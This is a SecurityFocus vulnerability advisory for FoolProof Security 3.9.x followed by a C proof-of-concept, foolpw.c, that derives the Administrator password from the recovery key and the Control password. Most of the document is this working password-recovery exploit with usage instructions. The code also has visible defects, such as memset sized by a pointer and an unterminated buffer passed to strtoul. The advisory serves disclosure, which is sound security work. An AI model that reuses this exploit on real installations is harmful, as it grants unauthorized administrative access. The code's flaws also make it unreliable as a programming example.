source: http://www.securityfocus.com/bid/10467/info

FoolProof is prone to a vulnerability that may allow an unprivileged user to recover the administrative password for the application. This issue can ultimately allow an attacker to gain unauthorized administrative access to the application.

This issue occurs because an attacker can manipulate the password recovery algorithm to recover an 'Administrator' password.

FoolProof versions 3.9.7 for Windows 98/ME and 3.9.4 for Windows 95 are affected by this issue. Subsequent versions of FoolProof do not contain the password recovery feature. 

/*    The following program calculates the "Administrator" password from the
    password recovery key and the "Control" password.
    
    Usage:
        
        Invoke the program with the following arguments:

        foolpw HEXADECIMAL_RECOVERY_KEY CONTROL_PASSWORD

        Example:

        C:\> foolpw BDAD8C8380A6B8BCAC8C2A45484A464C HelloWorld
        12345
    
    Source code:
*/
/*

foolpw.c
Copyright (C) 2004 Cyrillium Security Solutions and Services.

Demonstrates a weakness in FoolProof Security password recovery system. See
CYSA-0329 for details.

CYRILLIUM SECURITY SOLUTIONS AND SERVICES DOES NOT PROVIDE ANY WARRANTY FOR
THIS PROGRAM, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.
SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY
SERVICING, REPAIR OR CORRECTION.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc, char *argv[])
{
    int i; /* Index variable */
    char a, /* Temporary variable for calculations */
         k[33], /* Recovery key in hexadecimal */
         k_array[17], /* Recovery key as array */
         c[17], /* Control password */
         *b = "D:SKFOIJ(*EHJFL", /* Offsets */
         hex_temp[2], /* Temporary storage for hexadecimal conversion */
         *endptr; /* Output variable for strtoul */

    if (argc != 3)
    {
        puts ("Usage: foolpw RECOVERY_KEY CONTROL_PASSWORD");
        return 1;
    }
    if (strlen (argv[1]) != 16*2)
    {
        puts ("Recovery key must be 16 hexadecimal bytes (32 characters)");
        return 1;
    }
    if (strlen (argv[2]) > 16)
    {
        puts ("Passwords are limited to 16 characters");
        return 1;
    }
    memset (k, 0, sizeof (b));
    memset (k_array, 0, sizeof (b));
    memset (c, 0, sizeof (c));
    memset (hex_temp, 0, sizeof (hex_temp));
    strcpy (k, argv[1]);
    strcpy (c, argv[2]);

    for (i = 0; i < 16; i++)
    {
        memcpy (hex_temp, &k[i*2], 2);
        k_array[i] = strtoul (hex_temp, &endptr, 16);
        if (*endptr != '\0')
        {
            printf("\nInvalid hexadecimal character \'%c\'\n", *endptr);
            return 1;
        }
        a = (c[i] + b[i]) ^ k_array[i];
        putc (a, stdout);
    }
    puts ("");
    return 0;
}